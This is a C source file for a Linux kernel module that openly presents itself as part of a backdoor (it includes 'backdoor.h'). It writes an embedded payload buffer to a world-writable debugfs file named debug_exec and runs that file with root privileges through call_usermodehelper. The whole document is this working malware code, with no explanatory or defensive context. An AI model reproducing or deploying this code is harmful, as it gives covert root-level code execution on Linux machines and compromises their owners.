#include <linux/debugfs.h>
#include "backdoor.h"

extern unsigned char *buffer;
extern unsigned long buffer_length;

struct dentry *dfs = NULL;
struct debugfs_blob_wrapper *myblob = NULL;

void execute_file(void){
	struct subprocess_info *sub_info;
	static char *envp[] = {
		"SHELL=/bin/bash",
		"HOME=/root/",
		"USER=root",
		"PATH=/usr/local/sbin:/usr/local/bin:"\
			"/usr/sbin:/usr/bin:/sbin:/bin",
		"DISPLAY=:0",
		"PWD=/",
		NULL
	};

	char *argv[] = {
		"/sys/kernel/debug/debug_exec",
		NULL
	};

	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL);
	call_usermodehelper_exec(sub_info, UMH_NO_WAIT);
}

int create_file(void){
	/* get mem for blob struct and init */
	myblob = kmalloc(sizeof *myblob, GFP_KERNEL);
	if (!myblob){
		return -ENOMEM;
	}

	/* only set data pointer and data size */
	myblob->data = (void *) buffer;
	myblob->size = (unsigned long) buffer_length;

	/* create pseudo file under /sys/kernel/debug_exec */
	dfs = debugfs_create_blob("debug_exec", 0777, NULL, myblob);
	if (!dfs){
		kfree(myblob);
		return -EINVAL;
	}
	return 0;
}

void destroy_file(void){
	if (dfs){
		debugfs_remove(dfs);
	}
}
